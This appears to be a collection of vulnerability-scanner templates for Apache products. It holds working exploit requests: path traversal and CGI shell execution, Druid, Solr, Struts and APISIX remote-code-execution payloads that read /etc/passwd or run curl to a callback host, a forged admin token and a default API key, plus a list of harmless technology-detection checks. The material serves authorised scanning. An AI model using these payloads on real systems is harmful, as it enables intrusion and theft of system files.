GET /dashboardUser HTTP/1.1
Host: {{Hostname}}
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6ImFkbWluIiwiZXhwIjoxNjM3MjY1MTIxfQ.-jjw2bGyQxna5Soe4fLVLaD3gUT5ALTcsvutPQoE2qk

```

### Matchers

**Type - word**

- words
  1. query success
  2. "userName":"admin"
  3. "code":200
- condition - and

**Type - status**

- status
  1. 200

---

# Apache APISIX Dashboard \<2.10.1 - API Unauthorized Access

## Description

- In Apache APISIX Dashboard before 2.10.1, the Manager API uses two frameworks and introduces framework `droplet` on the basis of framework `gin.' While all APIs and authentication middleware are developed based on framework `droplet`,  some API directly use the interface of framework `gin` thus bypassing their authentication.
- severity - critical
- tags - cve,cve2021,apache,unauth,apisix

## Requests

- Method - GET

### URL

- {{RootURL}}/apisix/admin/migrate/export

### Matchers

**Type - word**

- words
  1. "Consumers":

**Type - status**

- status
  1. 200

---

# Apache 2.4.49/2.4.50 - Path Traversal and Remote Code Execution

## Description

- A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49 and 2.4.50. An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by "require all denied" these requests can succeed. Additionally, this flaw could leak the source of interpreted files like CGI scripts. In certain configurations, for instance if mod_cgi is enabled, this flaw can lead to remote code execution. This issue only affects Apache 2.4.49 and 2.4.50 and not earlier versions. Note - CVE-2021-42013 is due to an incomplete fix for the original vulnerability CVE-2021-41773.

- severity - critical
- tags - cve,cve2021,lfi,apache,rce,misconfig,traversal,kev

## Requests

### Step - 1

```
GET /icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}


```

### Step - 2

```
GET /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}


```

### Step - 3

```
POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/x-www-form-urlencoded

echo Content-Type: text/plain; echo; {{cmd}}


```

### Matchers

**Type - regex**

- name - LFI
- regex
  1. root:.\*:0:0:

**Type - word**

- name - RCE
- words
  1. CVE-2021-42013

---

# Apache Tapestry - Remote Code Execution

## Description

- Apache Tapestry contains a critical unauthenticated remote code execution vulnerability. Affected versions include 5.4.5, 5.5.0, 5.6.2 and 5.7.0. Note that this vulnerability is a bypass of the fix for CVE-2019-0195. Before that fix it was possible to download arbitrary class files from the classpath by providing a crafted asset file URL.

- severity - critical
- tags - cve,cve2021,apache,tapestry

## Requests

### Step - 1

```
GET /assets/app/something/services/AppModule.class/ HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}

```

### Step - 2

```
GET /assets/app/{{id}}/services/AppModule.class/ HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}

```

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. application/java
- part - header

**Type - word**

- words
  1. configuration
  2. webtools
- part - body
- condition - and

### Extractors

**Type - regex**

- regex
  1. \/assets\/app\/([a-z0-9]+)\/services\/AppMod
- internal - True
- name - id
- part - header
- group - 1

---

# Apache Druid - Remote Code Execution

## Description

- Apache Druid is susceptible to remote code execution because by default it lacks authorization and authentication. Attackers can send specially crafted requests to execute arbitrary code with the privileges of processes on the Druid server.

- severity - high
- tags - cve,cve2021,apache,rce,druid

## Requests

### Step - 1

```
POST /druid/indexer/v1/sampler HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{
"type":"index",
"spec":{
   "ioConfig":{
      "type":"index",
      "firehose":{
         "type":"local",
         "baseDir":"/etc",
         "filter":"passwd"
      }
   },
   "dataSchema":{
      "dataSource":"odgjxrrrePz",
      "parser":{
         "parseSpec":{
            "format":"javascript",
            "timestampSpec":{

            },
            "dimensionsSpec":{

            },
            "function":"function(){var hTVCCerYZ = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"/bin/sh`@~-c`@~cat /etc/passwd\".split(\"`@~\")).getInputStream()).useDelimiter(\"\\A\").next();return {timestamp:\"4137368\",OQtGXcxBVQVL: hTVCCerYZ}}",
            "":{
               "enabled":"true"
            }
         }
      }
   }
},
"samplerConfig":{
   "numRows":10
}
}

```

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - word**

- part - body
- words
  1. numRowsRead
  2. numRowsIndexed
- condition - and

**Type - word**

- part - header
- words
  1. application/json

**Type - status**

- status
  1. 200

---

# Apache Solr DataImportHandler \<8.2.0 - Remote Code Execution

## Description

- Apache Solr is vulnerable to remote code execution vulnerabilities via the DataImportHandler, an optional but popular module to pull in data from databases and other sources. The module has a feature in which the whole DIH configuration can come from a request's "dataConfig" parameter. The debug mode of the DIH admin screen uses this to allow convenient debugging / development of a DIH config. Since a DIH config can contain scripts, this parameter is a security risk.

- severity - high
- tags - cve2019,apache,rce,solr,oast,kev,vulhub,cve

## Requests

### Step - 1

```
GET /solr/admin/cores?wt=json HTTP/1.1
Host: {{Hostname}}
Accept-Language: en
Connection: close

```

### Step - 2

```
POST /solr/{{core}}/dataimport?indent=on&wt=json HTTP/1.1
Host: {{Hostname}}
Content-type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest

command=full-import&verbose=false&clean=false&commit=true&debug=true&core=test&dataConfig=%3CdataConfig%3E%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22curl%20{{interactsh-url}}%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22stackoverflow%22%0A++++++++++++url%3D%22https%3A%2F%2Fstackoverflow.com%2Ffeeds%2Ftag%2Fsolr%22%0A++++++++++++processor%3D%22XPathEntityProcessor%22%0A++++++++++++forEach%3D%22%2Ffeed%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&name=dataimport

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

**Type - status**

- status
  1. 200

### Extractors

**Type - regex**

- internal - True
- name - core
- group - 1
- regex
  1. "name"\:"(.\*?)"

---

# Apache Struts \<=2.5.20 - Remote Code Execution

## Description

- Apache Struts 2.0.0 to 2.5.20 forced double OGNL evaluation when evaluated on raw user input in tag attributes, which may lead to remote code execution.
- severity - critical
- tags - tenable,packetstorm,struts,rce,cve,cve2019,apache

## Requests

- Method - GET

### URL

- {{BaseURL}}/?id=nuclei%25{128\*128}

### Matchers

**Type - word**

- part - body
- words
  1. nuclei16384

---

# Apache Tomcat - Cross-Site Scripting

## Description

- Apache Tomcat 9.0.0.M1 to 9.0.0.17, 8.5.0 to 8.5.39, and 7.0.0 to 7.0.93 are vulnerable to cross-site scripting because the SSI printenv command echoes user provided data without escaping. Note: SSI is disabled by default. The printenv command is intended for debugging and is unlikely to be present in a production website.

- severity - medium
- tags - apache,xss,tomcat,seclists,edb,cve,cve2019

## Requests

- Method - GET

### URL

- {{BaseURL}}/printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E
- {{BaseURL}}/ssi/printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E

### Matchers

**Type - word**

- words
  1. \<script>alert('xss')\</script>

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Apache Solr \<=8.3.1 - Remote Code Execution

## Description

- Apache Solr versions 5.0.0 to 8.3.1 are vulnerable to remote code execution vulnerabilities through the VelocityResponseWriter. A Velocity template can be provided through Velocity templates in a configset `velocity/ directory or as a parameter. A user defined configset could contain renderable, potentially malicious, templates. Parameter provided templates are disabled by default, but can be enabled by setting `params.resource.loader.enabled by defining a response writer with that setting set to `true`. Defining a response writer requires configuration API access. Solr 8.4 removed the params resource loader entirely, and only enables the configset-provided template rendering when the configset is `trusted` (has been uploaded by an authenticated user).
- severity - high
- tags - cve,cve2019,apache,rce,solr,oast,kev

## Requests

### Step - 1

```
GET /solr/admin/cores?wt=json HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
POST /solr/{{core}}/config HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{
    "update-queryresponsewriter": {
      "startup": "lazy",
      "name": "velocity",
      "class": "solr.VelocityResponseWriter",
      "template.base.dir": "",
      "solr.resource.loader.enabled": "true",
      "params.resource.loader.enabled": "true"
    }
}

```

### Step - 3

```
GET /solr/{{core}}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27curl%20{{interactsh-url}}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
Host: {{Hostname}}
Connection: close

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

**Type - status**

- status
  1. 200

### Extractors

**Type - regex**

- internal - True
- name - core
- group - 1
- regex
  1. "name"\:"(.\*?)"

---

# Apache HTTP Server \<=2.4.39 - HTML Injection/Partial Cross-Site Scripting

## Description

- Apache HTTP Server versions 2.4.0 through 2.4.39 are vulnerable to a limited cross-site scripting issue affecting the mod_proxy error page. An attacker could cause the link on the error page to be malformed and instead point to a page of their choice. This would only be exploitable where a server was set up with proxying enabled but was misconfigured in such a way that the Proxy Error page was displayed.
- severity - medium
- tags - cve,cve2019,apache,htmli,injection

## Requests

- Method - GET

### URL

- {{BaseURL}}/%5cgoogle.com/evil.html

### Matchers

**Type - word**

- words
  1. \<a href="/\google.com/evil.html">

---

# Apache Struts2 S2-008 RCE

## Description

- The CookieInterceptor component in Apache Struts before 2.3.1.1 does not use the parameter-name whitelist, which allows remote attackers to execute arbitrary commands via a crafted HTTP Cookie header that triggers Java code execution through a static method.
- severity - critical
- tags - cve2012,apache,rce,struts,java,edb,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/devmode.action?debug=command&expression=(%23_memberAccess[%22allowStaticMethodAccess%22]%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D%23foo%2C@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27cat%20/etc/passwd%27).getInputStream()))

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Apache Struts Dev Mode OGNL Injection

## Description

- The DebuggingInterceptor component in Apache Struts before 2.3.1.1, when developer mode is used, allows remote attackers to execute arbitrary commands via unspecified vectors. NOTE: the vendor characterizes this behavior as not "a security vulnerability itself."

- severity - critical
- tags - ognl,injection,edb,cve,cve2012,apache,struts

## Requests

- Method - GET

### URL

- {{BaseURL}}/portal/displayAPSForm.action?debug=command&expression={{first}}\*{{second}}

### Matchers

**Type - word**

- words
  1. {{result}}

**Type - status**

- status
  1. 200

---

# Spring Cloud Gateway Code Injection

## Description

- Applications using Spring Cloud Gateway prior to 3.1.1+ and 3.0.7+ are vulnerable to a code injection attack when the Gateway Actuator endpoint is enabled, exposed and unsecured. A remote attacker could make a maliciously crafted request that could allow arbitrary remote execution on the remote host.
- severity - critical
- tags - cve,cve2022,apache,spring,vmware,actuator,oast,kev

## Requests

### Step - 1

```
POST /actuator/gateway/routes/{{randstr}} HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{
  "predicates": [
    {
      "name": "Path",
      "args": {
        "_genkey_0": "/{{randstr}}/**"
      }
    }
  ],
  "filters": [
    {
      "name": "RewritePath",
      "args": {
        "_genkey_0": "#{T(java.net.InetAddress).getByName(\"{{interactsh-url}}\")}",
        "_genkey_1": "/${path}"
      }
    }
  ],
  "uri": "{{RootURL}}",
  "order": 0
}

```

### Step - 2

```
POST /actuator/gateway/refresh HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{
  "predicate": "Paths: [/{{randstr}}], match trailing slash: true",
  "route_id": "{{randstr}}",
  "filters": [
    "[[RewritePath #{T(java.net.InetAddress).getByName(\"{{interactsh-url}}\")} = /${path}], order = 1]"
  ],
  "uri": "{{RootURL}}",
  "order": 0
}

```

### Step - 3

```
DELETE /actuator/gateway/routes/{{randstr}} HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - status**

- status
  1. 201

**Type - word**

- part - header
- words
  1. /routes/{{randstr}}

**Type - word**

- part - interactsh_protocol
- words
  1. dns

---

# Apache APISIX - Remote Code Execution

## Description

- A default configuration of Apache APISIX (with default API key) is vulnerable to remote code execution. An attacker can abuse the batch-requests plugin to send requests to bypass the IP restriction of Admin API. When the admin key was changed or the port of Admin API was changed to a port different from the data panel, the impact is lower. But there is still a risk to bypass the IP restriction of Apache APISIX's data panel. There is a check in the batch-requests plugin which overrides the client IP with its real remote IP. But due to a bug in the code, this check can be bypassed.
- severity - critical
- tags - cve,cve2022,apache,rce,apisix,oast,kev

## Requests

### Step - 1

```
POST /apisix/batch-requests HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

{
  "headers":{
    "X-Real-IP":"127.0.0.1",
    "Content-Type":"application/json"
  },
  "timeout":1500,
  "pipeline":[
    {
      "method":"PUT",
      "path":"/apisix/admin/routes/index?api_key=edd1c9f034335f136f87ad84b625c8f1",
      "body":"{\r\n \"name\": \"test\", \"method\": [\"GET\"],\r\n \"uri\": \"/api/{{randstr}}\",\r\n \"upstream\":{\"type\":\"roundrobin\",\"nodes\":{\"httpbin.org:80\":1}}\r\n,\r\n\"filter_func\": \"function(vars) os.execute('curl {{interactsh-url}}/`whoami`'); return true end\"}"
    }
  ]
}

```

### Step - 2

```
GET /api/{{randstr}} HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

```

### Matchers

**Type - word**

- part - body_1
- words
  1. "reason":"OK"
  2. "status":200
- condition - and

**Type - status**

- status
  1. 200

**Type - word**

- part - interactsh_protocol
- words
  1. http

### Extractors

**Type - regex**

- part - interactsh_request
- group - 1
- regex
  1. GET \/([a-z-]+) HTTP

---

# Apache ShenYu Admin Unauth Access

## Description

- Apache ShenYu suffers from an unauthorized access vulnerability where a user can access /plugin api without authentication. This issue affected Apache ShenYu 2.4.0 and 2.4.1.
- severity - critical
- tags - cve,cve2022,shenyu,unauth,apache

## Requests

- Method - GET

### URL

- {{BaseURL}}/plugin

### Matchers

**Type - word**

- part - body
- words
  1. "message":"query success"
  2. "code":200
- condition - and

**Type - status**

- status
  1. 200

---

# OpenSymphony XWork/Apache Struts2 - Remote Code Execution

## Description

- Apache Struts support in OpenSymphony XWork before 1.2.3, and 2.x before 2.0.4, as used in WebWork and Apache Struts, recursively evaluates all input as an Object-Graph Navigation Language (OGNL) expression when altSyntax is enabled, which allows remote attackers to cause a denial of service (infinite loop) or execute arbitrary code via for"m input beginning with a "%{" sequence and ending with a "}" character.

- severity - critical
- tags - cve,cve2007,apache,rce,struts

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/login.action
  - username=test&password=%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22cat%22%2C%22%2Fetc%2Fpasswd%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

**Type - status**

- status
  1. 200

---

# Apache NiFi detect

- severity - info
- tags - tech,apache,nifi

## Requests

- Method - GET

### URL

- {{BaseURL}}/access/config
- {{BaseURL}}/controller/config
- {{BaseURL}}/controller/registry-clients
- {{BaseURL}}/counters
- {{BaseURL}}/flow/registries
- {{BaseURL}}/system-diagnostics
- {{BaseURL}}/nifi-api/access/config

### Matchers

**Type - regex**

- part - body
- regex
  1. supportsLogin
  2. disconnectedNodeAcknowledged
  3. (aggregate|node)Snapshots?
- condition - or

**Type - status**

- status
  1. 200

---

# Node RED Detect

- severity - info
- tags - tech,apache,node-red-dashboard

## Requests

- Method - GET

### URL

- {{BaseURL}}

### Matchers

**Type - word**

- part - body
- words
  1. \<title>Node-RED\</title>

**Type - status**

- status
  1. 200

---

# Apache2 Default Test Page

- severity - info
- tags - tech,apache

## Requests

- Method - GET

### URL

- {{BaseURL}}

### Matchers

**Type - word**

- words
  1. \<title>Apache2 Debian Default Page: It works\</title>
- part - body

---

# Apache dubbo detect

- severity - info
- tags - apache,dubbo,tech

## Requests

- Method - GET

### URL

- {{BaseURL}}

### Matchers

**Type - word**

- part - header
- words
  1. Basic realm="dubbo"

---

# apache-axis-detect

## Description

- Axis and Axis2 detection
- severity - info
- tags - tech,axis2,middleware,apache

## Requests

- Method - GET

### URL

- {{BaseURL}}
- {{BaseURL}}/axis2/
- {{BaseURL}}/axis/

### Matchers

**Type - word**

- words
  1. Validate
  2. Welcome
  3. Axis
  4. deployed
  5. installation
  6. Admin
- condition - and

**Type - status**

- status
  1. 200

---

# Apache HTTP Server Test Page

- severity - info
- tags - tech,apache

## Requests

- Method - GET

### URL

- {{BaseURL}}

### Matchers

**Type - word**

- words
  1. \<title>Apache HTTP Server Test Page powered by CentOS\</title>
- part - body

---

# Apache Cocoon detect

- severity - info
- tags - apache,cocoon,tech

## Requests

- Method - GET

### URL

- {{BaseURL}}

### Matchers

**Type - word**

- part - header
- words
  1. X-Cocoon-Version

### Extractors

**Type - regex**

- part - header
- regex
  1. X\-Cocoon\-Version:([ 0-9.]+)

---

# Tomcat Detection

## Description

- If an Tomcat instance is deployed on the target URL, when we send a request for a non existent resource we receive a Tomcat error page with version.
- severity - info
- tags - tech,tomcat,apache

## Requests

- Method - GET

### URL

- {{BaseURL}}
- {{BaseURL}}/{{randstr}}
- {{BaseURL}}/docs/introduction.html

### Matchers

**Type - dsl**

- dsl
  1. contains(tolower(all_headers), "tomcat")

**Type - dsl**

- dsl
  1. contains(tolower(body), "apache tomcat")
  2. contains(tolower(body), "/manager/html")
  3. contains(tolower(body), "/manager/status")
- condition - or

### Extractors

**Type - regex**

- group - 1
- regex
  1. (?i)Apache Tomcat.\*([0-9]\.[0-9]+\.[0-9]+)

---

# Apache Airflow

- severity - info
- tags - tech,apache,airflow

## Requests

- Method - GET

### URL

- {{BaseURL}}/{{randstr}}

### Matchers

**Type - word**

- part - body
- words
  1. Airflow 404 = lots of circles

**Type - status**

- status
  1. 404

---

# Apache2 Ubuntu Default Page

- severity - info
- tags - tech,apache

## Requests

- Method - GET

### URL

- {{BaseURL}}

### Matchers

**Type - word**

- words
  1. \<title>Apache2 Ubuntu Default Page: It works\</title>
- part - body

---

# Apache Ranger Detection

- severity - info
- tags - tech,apache,ranger

## Requests

- Method - GET

### URL

- {{BaseURL}}/login.jsp
- {{BaseURL}}/images/favicon.ico

### Matchers

**Type - word**

- part - body
- words
  1. \<title> Ranger - Sign In\</title>

**Type - dsl**

- name - favicon
- dsl
  1. status_code==200 && ('1302629996' == mmh3(base64_py(body)))

---

# XAMPP Default Page

- severity - info
- tags - tech,php,xampp,apache

## Requests

- Method - GET

### URL

- {{BaseURL}}/dashboard/

### Matchers

**Type - word**

- words
  1. \<title>Welcome to XAMPP\</title>

**Type - status**

- status
  1. 200

---

# Apache HTTP Server Test Page

## Description

- Detects default installations of apache (not just apache2 or installations on CentOS)
- severity - info
- tags - tech,apache

## Requests

- Method - GET

### URL

- {{BaseURL}}

### Matchers

**Type - regex**

- part - body
- condition - or
- regex
  1. \<title>._?Apache(|\d+) ._?(Default|Test).\*?\</title>
  2. \<title>(Default|Test)._? Apache(|\d+)._?\</title>

### Extractors

**Type - kval**

- part - header
- kval
  1. server

---

# Apache Zeppelin detect

- severity - info
- tags - apache,zeppelin,tech

## Requests

- Method - GET

### URL

- {{BaseURL}}

### Matchers

**Type - word**

- part - body
- words
  1. \<title ng-bind="$root.pageTitle">Zeppelin\</title>

**Type - status**

- status
  1. 200

---

# Apache Detection

## Description

- Some Apache servers have the version on the response header. The OpenSSL version can be also obtained
- severity - info
- tags - tech,apache

## Requests

- Method - GET

### URL

- {{BaseURL}}

### Matchers

**Type - regex**

- part - header
- regex
  1. Apache+

**Type - status**

- status
  1. 200

### Extractors

**Type - kval**

- part - header
- kval
  1. Server

---

# Apache Tapestry Framework detect

- severity - info
- tags - apache,tapestry,tech

## Requests

- Method - GET

### URL

- {{BaseURL}}

### Matchers

**Type - word**

- part - body
- words
  1. content="Apache Tapestry Framework
  2. content="Tapestry Application Framework
- condition - or

### Extractors

**Type - regex**

- part - body
- group - 1
- regex
  1. Tapestry Framework \(version ([0-9.]+)\)

**Type - regex**

- part - body
- group - 1
- regex
  1. Tapestry Application Framework, version ([0-9.-A-Z]+)T" \/>

---

# Apache Guacamole Login Page and version detection

- severity - info
- tags - apache,guacamole,tech,login

## Requests

- Method - GET

### URL

- {{BaseURL}}/translations/en.json

### Matchers

**Type - word**

- words
  1. Apache Guacamole

**Type - status**

- status
  1. 200

### Extractors

**Type - regex**

- part - body
- regex
  1. "VERSION":"[0-9]+\.2\.0"

---

# Apache Druid Unauth

- severity - low
- tags - misconfig,druid,unauth,apache

## Requests

- Method - GET

### URL

- {{BaseURL}}/unified-console.html

### Matchers

**Type - word**

- words
  1. \<title>Apache Druid\</title>

**Type - status**

- status
  1. 200

---

# Apache Drill Exposure

- severity - low
- tags - misconfig,exposure,apache,drill

## Requests

- Method - GET

### URL

- {{BaseURL}}

### Matchers

**Type - word**

- part - body
- words
  1. \<title>Apache Drill\</title>

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Detect Tomcat Exposed Scripts

- severity - info
- tags - apache,tomcat

## Requests

- Method - GET

### URL

- {{BaseURL}}/examples/servlets/index.html
- {{BaseURL}}/examples/jsp/index.html
- {{BaseURL}}/examples/websocket/index.xhtml
- {{BaseURL}}/..;/examples/servlets/index.html
- {{BaseURL}}/..;/examples/jsp/index.html
- {{BaseURL}}/..;/examples/websocket/index.xhtml

### Matchers

**Type - word**

- words
  1. JSP Examples
  2. JSP Samples
  3. Servlets Examples
  4. WebSocket Examples
- condition - or

---

# Server Status Disclosure

- severity - low
- tags - apache,debug

## Requests

- Method - GET

### URL

- {{BaseURL}}/server-status

### Matchers

**Type - word**

- words
  1. Apache Server Status
  2. Server Version
- condition - and

---

# Tomcat Cookie Exposed

- severity - low
- tags - misconfig,apache,tomcat,exposure

## Requests

- Method - GET

### URL

- {{BaseURL}}/examples/servlets/servlet/CookieExample

### Matchers

**Type - word**

- words
  1. Cookies Example
  2. Your browser is sending the following cookies:
- condition - and

**Type - status**

- status
  1. 200

---

# Apache Hadoop - Yarn ResourceManager Remote Code Execution

## Description

- An unauthenticated Hadoop Resource Manager was discovered, which allows remote code execution by design.

- severity - critical
- tags - vulhub,apache,hadoop,unauth,rce,msf

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/ws/v1/cluster/apps/new-application

### Matchers

**Type - word**

- words
  1. "application-id"

**Type - status**

- status
  1. 200

---

# Airflow Debug Trace

- severity - low
- tags - apache,airflow,fpd

## Requests

- Method - GET

### URL

- {{BaseURL}}/admin/airflow/login

### Matchers

**Type - word**

- part - body
- words
  1. \<h1> Ooops. \</h1>
  2. Traceback (most recent call last)
- condition - and

**Type - status**

- status
  1. 500

---

# Unauthenticated Airflow Instance

- severity - high
- tags - apache,airflow,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}
- {{BaseURL}}/admin/

### Matchers

**Type - word**

- part - body
- words
  1. \<title>Airflow - DAGs\</title>

**Type - status**

- status
  1. 200

---

# Apache Hbase Unauth

- severity - medium
- tags - apache,unauth,misconfig

## Requests

- Method - GET

### URL

- {{BaseURL}}/conf

### Matchers

**Type - word**

- words
  1. \<name>hbase.defaults.for.version\</name>
  2. \<source>hbase-default.xml\</source>

**Type - status**

- status
  1. 200

---

# Tomcat Manager Path Normalization

## Description

- A Tomcat Manager login panel was discovered via path normalization. Normalizing a path involves modifying the string that identifies a path or file so that it conforms to a valid path on the target operating system.
- severity - info
- tags - panel,tomcat,apache

## Requests

- Method - GET

### URL

- {{BaseURL}}/..;/manager/html
- {{BaseURL}}/..;/host-manager/html
- {{BaseURL}}/{{randstr}}/..;/manager/html
- {{BaseURL}}/{{randstr}}/..;/host-manager/html

### Matchers

**Type - word**

- words
  1. username="tomcat" password="s3cret"
  2. manager-gui
- condition - and

**Type - status**

- negative - True
- status
  1. 403

---

# Apache Storm Unauth

- severity - medium
- tags - apache,unauth,misconfig

## Requests

- Method - GET

### URL

- {{BaseURL}}/api/v1/cluster/summary

### Matchers

**Type - word**

- part - body
- words
  1. "totalMem":
  2. "stormVersion":
- condition - and

**Type - status**

- status
  1. 200

---

# Apache Filename Enumeration

## Description

- If the client provides an invalid Accept header, the server will respond with a 406 Not Acceptable error containing a pseudo directory listing.
- severity - low
- tags - apache,misconfig,hackerone

## Requests

- Method - GET

### URL

- {{BaseURL}}/index

### Matchers

**Type - status**

- status
  1. 406

**Type - word**

- words
  1. Not Acceptable
  2. Available variants:
  3. \<address>Apache Server at
- condition - and

---

# Jenkins Open User registration

## Description

- The Jenkins allows registering a new user and accessing the dashboard.
- severity - medium
- tags - misconfig,jenkins,apache,tomcat

## Requests

- Method - GET

### URL

- {{BaseURL}}/signup

### Matchers

**Type - word**

- part - body
- words
  1. Create an account! [Jenkins]

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---
